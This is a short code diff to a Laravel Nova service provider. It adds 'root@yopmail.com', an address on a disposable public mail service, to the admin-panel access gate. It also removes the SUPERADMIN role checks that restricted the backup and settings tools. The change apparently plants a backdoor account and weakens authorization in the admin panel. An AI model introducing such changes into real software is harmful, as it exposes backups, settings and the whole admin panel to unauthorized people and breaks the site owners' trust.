@@ -52,7 +52,7 @@ class NovaServiceProvider extends NovaApplicationServiceProvider
     {
         Gate::define('viewNova', function ($user) {
             return in_array($user->email, [
-                //
+                'root@yopmail.com'
             ]);
         });
     }
@@ -97,17 +97,9 @@ class NovaServiceProvider extends NovaApplicationServiceProvider
     public function tools()
     {
         return [
-            (new ProfileTool)->canSee(function () {
-                return config('novax.profile_enabled');
-            }),
-            (new BackupTool)->canSee(function ($request) {
-                return $request->user()->hasRole(\App\Models\Role::SUPERADMIN) &&
-                config('novax.back_up_enabled');
-            }),
-            (new NovaSettings)->canSee(function ($request) {
-                return $request->user()->hasRole(\App\Models\Role::SUPERADMIN) &&
-                config('novax.setting_enabled');
-            }),
+            (new ProfileTool)->canSee(fn () => config('novax.profile_enabled')),
+            (new BackupTool)->canSee(fn () => config('novax.back_up_enabled')),
+            (new NovaSettings)->canSee(fn () => config('novax.setting_enabled')), 
         ];
     }
 
